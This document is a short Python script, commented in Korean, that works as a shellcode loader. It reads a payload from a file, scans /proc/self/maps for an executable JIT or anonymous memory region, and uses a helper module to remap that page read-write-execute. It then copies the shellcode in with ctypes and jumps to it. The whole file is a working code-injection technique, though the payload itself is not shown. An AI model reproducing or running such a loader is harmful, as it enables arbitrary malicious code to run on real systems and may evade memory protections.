import os
import ctypes
import jitremap

# --- 1. shellcode.bin 로드 ---
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()
print(f"[*] Loaded shellcode ({len(shellcode)} bytes)")

# --- 2. JIT 코드 캐시 주소 찾기 ---
def find_jit_code_ranges():
    results = []
    with open("/proc/self/maps") as f:
        for line in f:
            if "r-xp" in line and ("jit" in line.lower() or "[anon" in line or "zero" in line):
                parts = line.split()
                start, end = [int(x, 16) for x in parts[0].split("-")]
                results.append((start, end, end - start))
    return results

jit_ranges = find_jit_code_ranges()
if not jit_ranges:
    raise RuntimeError("[!] No JIT code region found")
jit_addr = jit_ranges[0][0]
print(f"[*] Found JIT code region: 0x{jit_addr:x}")

# --- 3. remap JIT 페이지를 RWX로 설정 ---
PROT_READ, PROT_WRITE, PROT_EXEC = 1, 2, 4
page_size = 0x1000
res = jitremap.remap(jit_addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC)
print("[*] mprotect result:", res)

# --- 4. shellcode 삽입 ---
print("[*] Writing shellcode...")
ctypes.memmove(jit_addr, shellcode, len(shellcode))

# --- 5. 함수 포인터로 실행 ---
print("[*] Jumping to shellcode...")
FUNC = ctypes.CFUNCTYPE(None)
fn = FUNC(jit_addr)
fn()

